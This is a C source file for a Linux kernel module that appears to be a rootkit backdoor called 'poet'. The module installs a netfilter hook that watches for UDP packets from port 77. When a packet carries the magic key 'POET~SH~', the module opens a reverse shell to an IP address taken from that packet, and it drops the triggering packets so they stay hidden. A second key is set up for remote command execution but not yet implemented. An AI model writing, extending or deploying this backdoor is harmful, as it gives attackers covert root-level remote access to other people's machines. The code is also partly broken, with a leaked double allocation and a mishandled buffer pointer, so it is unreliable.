#include "exec.c"

const char* sKEY = "POET~SH~";
const char* cKEY = "POET~CM~";
const char* PORT = "7337"; 

static unsigned int my_nf_hookIn(void *priv,
              struct sk_buff *skb,
              const struct nf_hook_state *state)
{
    //Network headers
    struct iphdr *ip_header;        //ip header
	struct udphdr *udp_header;
    struct sk_buff *sock_buff = skb; //sock buffer
    char *user_data;       //data header pointer
    int size;                       //payload size
    char* _data;
    struct udphdr _udphdr;
    struct iphdr _iph;
    char ip_source[16];
    //char port[16];

    if (!sock_buff) 
    {
        return NF_ACCEPT; //socket buffer empty
    }
    
    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
    if (!ip_header)
    {
        return NF_ACCEPT;
    }

    if(ip_header->protocol==IPPROTO_UDP)
    { 
        unsigned int dport;
        unsigned int sport;

        udp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_udphdr), &_udphdr); 

        sport = htons((unsigned short int) udp_header->source);
        dport = htons((unsigned short int) udp_header->dest);
        if(sport != 77) 
        {
            return NF_ACCEPT; //We ignore those not for port 77
        }
        printk(KERN_INFO "poet: Received packet on port 77\n");

        // snprintf(ip_source, 16, "%pI4", &ip_header->saddr); // getting source address
 
        size = htons(ip_header->tot_len) - sizeof(_iph) - 8; // total ip header length - sizeof just ip header - sizeof udp header (8)
        _data = kmalloc(size, GFP_KERNEL);

        if (!_data)
            return NF_ACCEPT;

        _data = kmalloc(size, GFP_KERNEL);
        user_data = skb_header_pointer(skb, ip_header->ihl*4 + 8, size, &_data);
        if(!user_data)
        {
            printk(KERN_INFO "NULL INFO");
            kfree(_data);
            return NF_ACCEPT;
        }
        // format=POET~IP

        printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
        printk(KERN_DEBUG "%s\n", user_data);
        printk(KERN_INFO "%s\n", ip_source);
        if (memcmp(user_data, sKEY, strlen(sKEY))==0) // reverse shell 
        {
            char* revIP = kmalloc(32, GFP_KERNEL);
            strncpy(revIP, user_data + 8, 32);
            printk(KERN_INFO "successful compare and %s\n", revIP);

            start_reverse_shell(revIP, PORT);

            kfree(revIP);
            return NF_DROP;
        } 
        else if (memcmp(user_data, cKEY, strlen(cKEY))==0)
        {
            char* command = kmalloc(64, GFP_KERNEL);
            strncpy(command, user_data + 8, 64);

            // TODO add execute method call here

            kfree(command);
            return NF_DROP;
        }
        return NF_ACCEPT;
    }
    return NF_ACCEPT;
}


struct nf_hook_ops my_nfin = {
      .hook        = my_nf_hookIn,
      .hooknum     = NF_INET_PRE_ROUTING,
      .pf          = PF_INET,
      .priority    = NF_IP_PRI_FIRST
};
